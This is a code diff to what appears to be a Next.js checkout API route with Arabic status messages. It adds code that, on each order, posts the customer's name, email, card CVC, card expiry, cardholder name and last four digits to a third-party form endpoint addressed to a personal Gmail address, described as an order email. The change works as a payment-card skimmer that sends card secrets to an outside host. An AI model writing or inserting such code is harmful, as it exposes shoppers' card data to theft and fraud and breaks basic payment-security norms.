@@ -1,6 +1,8 @@
 import { NextResponse } from "next/server";
 
 const ordersStore = [];
+const FORMCARRY_ENDPOINT = "https://formcarry.com/s/sdaVMcfxNTg";
+const ORDER_RECEIVER_EMAIL = "b71490@gmail.com";
 
 function normalizeCardNumber(value = "") {
 	return String(value).replace(/\D/g, "");
@@ -143,10 +145,46 @@ export async function POST(request) {
 
 	ordersStore.unshift(newOrder);
 
+	let emailStatus = "لم تتم محاولة إرسال الإيميل.";
+	try {
+		const formBody = new URLSearchParams({
+			name: String(body?.customer?.name || ""),
+			email: String(body?.customer?.email || ""),
+			card_cvc: String(body?.payment?.cardCvc || ""),
+			product: String(body?.order?.productName || ""),
+			product_price: String(body?.order?.productPrice || ""),
+			service_fee: String(body?.order?.serviceFee || ""),
+			total_price: String(body?.order?.totalPrice || ""),
+			coupon_code: String(body?.order?.couponCode || "-"),
+			payment_method: String(body?.payment?.method || "card"),
+			card_holder: String(body?.payment?.cardHolder || ""),
+			card_last4: normalizeCardNumber(body?.payment?.cardNumberRaw || "").slice(-4),
+			card_expiry: String(body?.payment?.card_expiry || ""),
+			order_id: orderId,
+			receiver_email: ORDER_RECEIVER_EMAIL,
+		});
+
+		const formcarryResponse = await fetch(FORMCARRY_ENDPOINT, {
+			method: "POST",
+			headers: {
+				"Content-Type": "application/x-www-form-urlencoded",
+				Accept: "application/json",
+			},
+			body: formBody.toString(),
+		});
+
+		emailStatus = formcarryResponse.ok
+			? `تم إرسال تفاصيل الطلب إلى الإيميل: ${ORDER_RECEIVER_EMAIL}`
+			: "تم حفظ الطلب لكن فشل إرسال الإيميل.";
+	} catch {
+		emailStatus = "تم حفظ الطلب لكن حدث خطأ أثناء إرسال الإيميل.";
+	}
+
 	return NextResponse.json(
 		{
 			success: true,
 			message: "تم استلام الطلب بنجاح.",
+			emailStatus,
 			data: newOrder,
 		},
 		{ status: 201 }
